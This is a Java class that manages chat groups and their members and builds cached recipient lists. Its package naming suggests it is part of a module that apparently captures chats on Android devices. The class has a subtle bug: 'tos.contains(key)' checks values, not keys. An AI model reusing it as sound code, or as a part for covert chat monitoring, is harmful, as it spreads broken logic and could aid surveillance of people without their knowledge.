package com.android.networking.module.chat;

import java.util.ArrayList;
import java.util.HashSet;
import java.util.Hashtable;
import java.util.List;
import java.util.Set;
import java.util.TreeSet;

import com.android.networking.auto.Cfg;
import com.android.networking.util.Check;

/* Gestore di gruppi di utenti nelle chat */
public abstract class ChatGroups {
	private static final String TAG = "ChatGroups";
    Contact contact;
    Hashtable<String, Contact> contacts = new Hashtable<String, Contact>();
    
	final Hashtable<String, Set<String>> groups = new Hashtable<String, Set<String>>();
	final Hashtable<String, String> tos = new Hashtable<String, String>();

	void addPeerToGroup(String groupName, String remote) {
		addPeerToGroup(groupName, new Contact(remote));
	}
	
	/* identificato un gruppo si aggiunge, uno alla volta con questo metodo, un peer */
	void addPeerToGroup(String groupName, Contact remote) {
		if (Cfg.DEBUG) {
			Check.requires(isGroup(groupName), "peer is not a group: " + groupName);
			Check.log("Adding group " + groupName + " : " + remote);
		}
		
		Set<String> set;
		if (!groups.containsKey(groupName)) {
			set = new HashSet<String>();
		}else{
			set = groups.get(groupName);
		}
		
		set.add(remote.id);
		contacts.put(remote.id, remote);
		
		groups.put(groupName, set);
	}

	
	Contact getContact(String id){
		return contacts.get(id);
	}
	
	/* dato un autore e un gruppo, restituisce la stringa di tutti i destinatari */
	String getGroupTo(String author, String groupname) {
		String key = author + groupname;
		if (tos.contains(key)) {
			return tos.get(key);
		}

		Set<String> set = groups.get(groupname);
		if(set==null){
			return null;
		}
		StringBuilder builder = new StringBuilder();
		for (String cid : set) {
			Contact c = contacts.get(cid);
			if (!author.equals(c.number) && !author.equals(cid)) {
				builder.append(c.number);
				builder.append(",");
			}
		}

		String value = builder.toString();
		tos.put(key, value);
		return value;
	}

	/* dato un peer, dice se e' un gruppo */
	abstract boolean isGroup(String peer);

	/* verifica che il gruppo sia gia' presente */
	public boolean hasMemoizedGroup(String groupName) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (hasMemoizedGroup) : " + groupName + " : " + groups.containsKey(groupName));
		}
		return groups.containsKey(groupName);
	}

}
